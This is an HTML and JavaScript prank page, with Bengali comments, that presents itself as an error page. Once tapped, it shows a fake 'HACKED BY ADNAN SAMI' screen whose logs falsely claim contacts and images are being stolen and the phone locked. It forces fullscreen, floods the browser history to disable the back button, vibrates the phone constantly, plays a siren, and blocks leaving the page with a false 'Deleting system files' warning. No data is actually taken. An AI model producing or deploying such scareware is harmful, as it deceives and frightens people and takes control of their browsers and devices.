<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Error 404</title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            overflow: hidden; background: black; color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            user-select: none; touch-action: none;
        }

        /* ম্যাট্রিক্স ব্যাকগ্রাউন্ড */
        #matrix { position: fixed; top: 0; left: 0; z-index: 1; }

        /* হ্যাকিং টেক্সট লেয়ার */
        #ui-layer {
            position: absolute; z-index: 10;
            padding: 20px; background: rgba(0, 0, 0, 0.7);
            height: 100vh; width: 100%; pointer-events: none;
            box-sizing: border-box;
        }

        .terminal-text {
            font-size: 14px; margin-bottom: 8px;
            text-shadow: 0 0 5px #0f0;
            white-space: nowrap; overflow: hidden;
            border-right: 2px solid #0f0;
            width: 0;
            animation: typing 1s steps(40) forwards;
        }

        @keyframes typing { from { width: 0 } to { width: 100% } }

        /* হ্যাকার ট্যাগ */
        #hacker-tag {
            position: fixed; top: 40%; left: 50%;
            transform: translate(-50%, -50%);
            color: #ff0000; font-size: 35px; font-weight: bold;
            text-align: center; z-index: 100;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            display: none; letter-spacing: 3px;
            animation: blink 0.4s infinite;
        }

        /* ওয়ার্নিং মেসেজ */
        #warning {
            position: fixed; bottom: 10%; left: 50%;
            transform: translateX(-50%);
            color: white; font-size: 18px;
            text-align: center; display: none; z-index: 100;
            background: red; padding: 10px; width: 90%;
        }

        @keyframes blink {
            0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            50% { opacity: 0.5; transform: translate(-50%, -50%) scale(1.1); }
            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }

        #overlay-shield {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999; background: rgba(255,255,255,0.01);
            display: flex; align-items: center; justify-content: center;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="overlay-shield"><p style="color:white; opacity:0.3;">Loading content...</p></div>

    <canvas id="matrix"></canvas>

    <div id="ui-layer">
        <div id="console"></div>
    </div>

    <div id="hacker-tag">HACKED BY<br>ADNAN SAMI</div>
    <div id="warning">CRITICAL ERROR: PHONE SECURITY BREACHED</div>

    <audio id="siren" loop>
        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
        <source src="https://actions.google.com/sounds/v1/alarms/emergency_it_is_happening.ogg" type="audio/ogg">
    </audio>

    <script>
        const consoleEl = document.getElementById('console');
        const matrixCanvas = document.getElementById('matrix');
        const ctx = matrixCanvas.getContext('2d');
        const siren = document.getElementById('siren');

        // ১. ম্যাট্রিক্স গ্রিন লাইন অ্যানিমেশন
        matrixCanvas.height = window.innerHeight;
        matrixCanvas.width = window.innerWidth;
        const characters = "10101010101010101010101";
        const fontSize = 16;
        const columns = matrixCanvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
            ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
            ctx.fillStyle = "#0f0";
            ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }

        // ২. ফেক হ্যাকিং মেসেজ
        const logs = [
            "> Initializing exploit...",
            "> Bypassing device security...",
            "> Accessing personal data...",
            "> Transferring contacts...",
            "> Uploading images to cloud...",
            "> Formatting system files...",
            "> ALERT: Unauthorized Access!",
            "> LOCKING DEVICE PERMANENTLY..."
        ];

        let logIndex = 0;
        function addLog() {
            if (logIndex < logs.length) {
                const div = document.createElement('div');
                div.className = 'terminal-text';
                div.innerText = logs[logIndex];
                consoleEl.appendChild(div);
                logIndex++;
                if (navigator.vibrate) navigator.vibrate(200); 
            } else {
                document.getElementById('hacker-tag').style.display = 'block';
                document.getElementById('warning').style.display = 'block';
            }
        }

        // ৩. মেইন প্র্যাঙ্ক ফাংশন
        function startChaos() {
            document.getElementById('overlay-shield').style.display = 'none';

            // সাউন্ড প্লে করা
            siren.play().catch(e => console.log("Sound error"));

            // ফুল স্ক্রিন
            const doc = document.documentElement;
            if (doc.requestFullscreen) doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();

            // হিস্ট্রি ফ্লাড (ব্যাক বাটন ব্লক)
            for (let i = 0; i < 300; i++) {
                window.history.pushState(null, "", window.location.href + "#/HACKED_" + i);
            }

            setInterval(drawMatrix, 40);
            setInterval(addLog, 1200);

            // এক্সট্রিম ভাইব্রেশন
            setInterval(() => {
                if (navigator.vibrate) {
                    navigator.vibrate([1000, 100, 1000, 100]);
                }
            }, 500);

            window.onpopstate = function() {
                alert("FATAL ERROR: ADNAN SAMI HAS YOUR PHONE");
                for (let i = 0; i < 10; i++) window.history.pushState(null, "", "");
            };
        }

        document.getElementById('overlay-shield').addEventListener('click', startChaos);
        document.getElementById('overlay-shield').addEventListener('touchstart', startChaos);

        window.onbeforeunload = function() {
            return "Deleting system files... Are you sure?";
        };
    </script>
</body>
  </html>
